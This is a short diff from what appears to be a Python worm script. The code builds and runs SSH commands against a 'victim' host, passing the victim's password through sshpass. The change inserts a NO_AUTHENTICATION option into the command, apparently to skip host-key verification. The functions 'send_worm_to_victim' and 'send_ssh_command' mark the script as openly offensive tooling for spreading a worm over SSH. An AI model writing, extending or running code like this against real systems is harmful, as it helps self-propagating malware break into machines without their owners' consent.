@@ -30,7 +30,7 @@ def send_worm_to_victim():
 def send_ssh_command(command, isNeedPw=True):
     print('[Send SSH Command] ' + command)
     sshCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
-    sshCommand += 'ssh -t {0}@{1} -p {2} \"{3}\"'.format(victim['name'], victim['ip'], victim['port'], command)
+    sshCommand += 'ssh -t {0}@{1} -p {2} {3} \"{4}\"'.format(victim['name'], victim['ip'], victim['port'], NO_AUTHENTICATION, command)
 
     os.system(sshCommand)
 
